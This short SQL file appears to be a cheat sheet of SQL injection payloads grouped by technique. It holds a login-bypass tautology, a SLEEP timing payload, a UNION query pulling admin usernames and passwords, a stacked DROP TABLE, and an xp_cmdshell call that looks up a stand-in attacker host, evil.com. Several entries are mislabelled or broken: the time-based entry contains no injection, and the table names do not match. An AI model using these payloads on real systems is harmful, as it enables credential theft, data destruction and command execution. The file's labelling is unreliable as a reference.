-- Classic SQL Injection
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1';

-- Blind SQL Injection
SELECT * FROM products WHERE product_id=1 OR IF(1=1, SLEEP(5), 0);

-- Time-Based Blind SQL Injection
SELECT * FROM orders WHERE order_id=1;

-- UNION-based SQL Injection
SELECT name, email FROM users WHERE user_id=-1 UNION ALL SELECT username, password FROM admin;

-- Second-Order SQL Injection (initial input)
-- [User input is expected to be inserted into the query later]

-- Stored SQL Injection
INSERT INTO comments (text) VALUES (''); DROP TABLE comment;

-- Out-of-Band SQL Injection
SELECT * FROM users WHERE username='' OR 1=1; EXEC xp_cmdshell('nslookup evil.com');
